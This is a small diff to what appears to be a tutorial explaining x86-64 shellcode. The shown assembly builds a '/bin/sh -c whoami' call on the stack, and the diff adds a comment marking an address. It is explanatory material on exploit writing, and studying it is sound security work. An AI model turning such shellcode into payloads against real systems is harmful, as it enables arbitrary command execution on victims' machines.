@@ -60,6 +60,8 @@ The shellcode can be explained in 4 steps:
     mov rsi, rsp ; rsi now points to -c.
     push rdx ; Place a nullbyte on the stack
     call   0x7fffffffdd57 ; The saved RIP on the stack is not actually an instruction, but 'whoami'. Which is on top of the stack after the call.
+    
+    ; At address 0x7fffffffdd57:
     push rsi ("-c")
     push rdi ("/bin/sh")  ;
     ```
